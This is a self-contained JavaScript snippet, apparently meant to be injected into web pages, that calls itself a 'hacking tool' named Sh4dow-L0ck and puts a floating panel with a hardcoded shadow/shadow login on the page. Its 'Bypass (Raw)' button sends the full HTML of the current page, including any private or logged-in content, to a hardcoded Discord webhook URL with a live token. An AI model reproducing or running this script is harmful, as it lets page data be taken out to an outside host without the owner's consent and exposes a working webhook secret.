(function () {
    if (document.querySelector("#shadow-lock")) return;

    // Estado da aplicação
    let isLoggedIn = false;
    let isMinimized = false;

    // Função para criar a janela flutuante
    function createFloatingWindow(content) {
        const div = document.createElement("div");
        div.id = "shadow-lock";
        
        // Container da janela
        div.innerHTML = `
            <style>
                #shadow-lock {
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    background: #1e1e1e;
                    color: #ffffff;
                    border: 2px solid #424642;
                    border-radius: 10px;
                    z-index: 999999;
                    font-family: Arial, sans-serif;
                    width: 350px;
                    box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
                    transition: all 0.3s ease;
                }

                #shadow-lock.minimized {
                    top: auto;
                    bottom: 20px;
                    left: 20px;
                    transform: none;
                    width: 200px;
                    height: auto;
                    border-radius: 10px;
                }

                #shadow-lock.minimized .window-content {
                    display: none;
                }

                #shadow-lock.minimized .window-header {
                    border-radius: 10px;
                    cursor: pointer;
                }

                #shadow-lock.minimized .window-header h3 {
                    font-size: 14px;
                }

                .window-header {
                    background: #2c2c2c;
                    padding: 10px 15px;
                    border-radius: 10px 10px 0 0;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border-bottom: 2px solid #424642;
                    cursor: move;
                    user-select: none;
                }

                .window-header h3 {
                    margin: 0;
                    color: #db3030;
                    font-size: 16px;
                    font-weight: bold;
                }

                .window-controls {
                    display: flex;
                    gap: 8px;
                }

                .window-controls button {
                    background: none;
                    border: none;
                    color: #fff;
                    cursor: pointer;
                    font-size: 18px;
                    padding: 0 5px;
                    transition: all 0.2s ease;
                    line-height: 1;
                }

                .window-controls .minimize-btn:hover {
                    color: #ffd700;
                    transform: scale(1.2);
                }

                .window-controls .close-btn:hover {
                    color: #ff4444;
                    transform: scale(1.2);
                }

                .window-content {
                    padding: 20px;
                    text-align: center;
                }

                .window-content h1 {
                    color: #db3030;
                    font-size: 40px;
                    margin-bottom: 10px;
                    margin-top: 0;
                }

                .window-content p {
                    color: #7e7979;
                    font-size: 16px;
                    margin-bottom: 15px;
                }

                .window-content input {
                    width: 100%;
                    padding: 10px;
                    margin: 8px 0;
                    background: #2c2c2c;
                    color: #fff;
                    border: 2px solid #424642;
                    border-radius: 5px;
                    box-sizing: border-box;
                    font-size: 14px;
                }

                .window-content input:focus {
                    outline: none;
                    border-color: #db3030;
                }

                .window-content button {
                    background-color: #424642;
                    color: white;
                    padding: 10px 25px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 14px;
                    transition: all 0.3s ease;
                    margin: 5px;
                    width: 100%;
                }

                .window-content button:hover {
                    background-color: #5f5b5b;
                    transform: scale(1.02);
                }

                .window-content .btn-danger {
                    background-color: #8b0000;
                }

                .window-content .btn-danger:hover {
                    background-color: #a00000;
                }

                .window-content .btn-success {
                    background-color: #2e7d32;
                }

                .window-content .btn-success:hover {
                    background-color: #388e3c;
                }

                .home-content {
                    display: ${isLoggedIn ? 'block' : 'none'};
                }

                .login-content {
                    display: ${isLoggedIn ? 'none' : 'block'};
                }

                .status-bar {
                    margin-top: 10px;
                    padding: 8px;
                    background: #2c2c2c;
                    border-radius: 5px;
                    font-size: 12px;
                    color: #7e7979;
                }

                .status-bar .online {
                    color: #4caf50;
                }

                #shadow-lock.dragging {
                    opacity: 0.8;
                    cursor: grabbing;
                }
            </style>

            <div class="window-header">
                <h3>🔒 Sh4dow-L0ck</h3>
                <div class="window-controls">
                    <button class="minimize-btn" title="Minimizar">─</button>
                    <button class="close-btn" title="Fechar">✕</button>
                </div>
            </div>

            <div class="window-content">
                ${content}
            </div>
        `;

        document.body.appendChild(div);

        // Adicionar funcionalidades da janela
        setupWindowControls(div);
        setupDragging(div);

        return div;
    }

    // Função para configurar os controles da janela
    function setupWindowControls(window) {
        const minimizeBtn = window.querySelector('.minimize-btn');
        const closeBtn = window.querySelector('.close-btn');

        // Minimizar
        minimizeBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            isMinimized = !isMinimized;
            window.classList.toggle('minimized', isMinimized);
            
            // Se minimizado, clicar no header restaura
            const header = window.querySelector('.window-header');
            if (isMinimized) {
                header.style.cursor = 'pointer';
            } else {
                header.style.cursor = 'move';
            }
        });

        // Fechar
        closeBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            if (confirm('Deseja realmente fechar o Sh4dow-L0ck?')) {
                window.remove();
            }
        });

        // Restaurar ao clicar no header quando minimizado
        const header = window.querySelector('.window-header');
        header.addEventListener('click', function(e) {
            if (isMinimized && !e.target.closest('.window-controls')) {
                isMinimized = false;
                window.classList.remove('minimized');
                header.style.cursor = 'move';
            }
        });
    }

    // Função para arrastar a janela
    function setupDragging(window) {
        const header = window.querySelector('.window-header');
        let isDragging = false;
        let offsetX, offsetY;

        header.addEventListener('mousedown', function(e) {
            if (isMinimized || e.target.closest('.window-controls')) return;
            
            isDragging = true;
            const rect = window.getBoundingClientRect();
            offsetX = e.clientX - rect.left;
            offsetY = e.clientY - rect.top;
            
            window.classList.add('dragging');
            
            // Estilo para arrastar
            window.style.position = 'fixed';
            window.style.top = rect.top + 'px';
            window.style.left = rect.left + 'px';
            window.style.transform = 'none';
        });

        document.addEventListener('mousemove', function(e) {
            if (!isDragging) return;
            
            const x = e.clientX - offsetX;
            const y = e.clientY - offsetY;
            
            window.style.left = x + 'px';
            window.style.top = y + 'px';
        });

        document.addEventListener('mouseup', function() {
            if (isDragging) {
                isDragging = false;
                window.classList.remove('dragging');
            }
        });
    }

    // Função de login
    function handleLogin(window) {
        const userInput = window.querySelector('#user');
        const passInput = window.querySelector('#pass');
        const loginBtn = window.querySelector('#loginBtn');

        loginBtn.addEventListener('click', function() {
            const u = userInput.value.trim();
            const p = passInput.value.trim();

            if (u === "shadow" && p === "shadow") {
                isLoggedIn = true;
                alert("✅ Login bem-sucedido!");
                updateContent(window);
            } else {
                alert("❌ Usuário ou senha incorretos.");
                userInput.value = '';
                passInput.value = '';
                userInput.focus();
            }
        });

        // Permitir login com Enter
        passInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                loginBtn.click();
            }
        });
    }

    // Função para enviar raw via webhook
    async function enviarRaw() {
        try {
            const codigoFonte = document.documentElement.outerHTML;
            const blob = new Blob([codigoFonte], { type: 'text/plain' });
            const formData = new FormData();
            formData.append('file', blob, 'pagina.txt');
            formData.append('content', '📄 Código fonte da página:');
            
            const webhook = "https://discord.com/api/webhooks/1526964094425632778/C4BrHbWn7b_8mhpHU8zVZlyiJVugT4q_4IoZvVsu_sKA6SgWY9Qhi94xP6Uf1aZ75KlI";
            const resposta = await fetch(webhook, {
                method: 'POST',
                body: formData
            });
            
            if (resposta.ok) {
                alert("✅ Arquivo TXT enviado com sucesso!");
                console.log("✅ Arquivo TXT enviado!");
            } else {
                alert("❌ Erro ao enviar: " + resposta.status);
                console.warn("❌ Erro:", resposta.status);
            }
        } catch(e) {
            alert("❌ Erro: " + e.message);
            console.warn("❌ Erro:", e);
        }
    }

    // Função para atualizar o conteúdo da janela
    function updateContent(window) {
        const content = window.querySelector('.window-content');
        
        if (isLoggedIn) {
            content.innerHTML = `
                <h1>Sh4dow-L0ck</h1>
                <p>Bem-vindo ao Sh4dow-L0ck</p>
                <p>Ferramenta de hacking feita por ghost</p>
                
                <button class="btn-success" id="bypassBtn">🚀 Bypass (Raw)</button>
                <button class="btn-danger" id="logoutBtn" style="margin-top:10px;">🚪 Logout</button>
                
                <div class="status-bar">
                    <span class="online">● Online</span> | Conectado como: shadow
                </div>
            `;

            // Adicionar eventos dos botões
            content.querySelector('#bypassBtn').addEventListener('click', enviarRaw);
            content.querySelector('#logoutBtn').addEventListener('click', function() {
                if (confirm('Deseja realmente fazer logout?')) {
                    isLoggedIn = false;
                    updateContent(window);
                }
            });
        } else {
            content.innerHTML = `
                <h1>Sh4dow-L0ck</h1>
                <p>Bem-vindo ao Sh4dow-L0ck</p>
                <p>Faça login para continuar</p>
                
                <input id="user" placeholder="Usuário" autofocus>
                <input id="pass" type="password" placeholder="Senha">
                
                <button id="loginBtn">🔑 Entrar</button>
                
                <div class="status-bar">
                    <span class="offline">● Offline</span> | Aguardando login
                </div>
            `;

            // Configurar login
            handleLogin(window);
        }
    }

    // Criar a janela inicial
    const initialContent = `
        <h1>Sh4dow-L0ck</h1>
        <p>Bem-vindo ao Sh4dow-L0ck</p>
        <p>Faça login para continuar</p>
        
        <input id="user" placeholder="Usuário" autofocus>
        <input id="pass" type="password" placeholder="Senha">
        
        <button id="loginBtn">🔑 Entrar</button>
        
        <div class="status-bar">
            <span class="offline">● Offline</span> | Aguardando login
        </div>
    `;

    const window = createFloatingWindow(initialContent);
    
    // Configurar login
    handleLogin(window);

    // Adicionar suporte para tecla ESC (fechar)
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            const closeBtn = document.querySelector('#shadow-lock .close-btn');
            if (closeBtn) closeBtn.click();
        }
    });

    console.log('🔒 Sh4dow-L0ck carregado!');
    console.log('📝 Credenciais: shadow/shadow');
})();
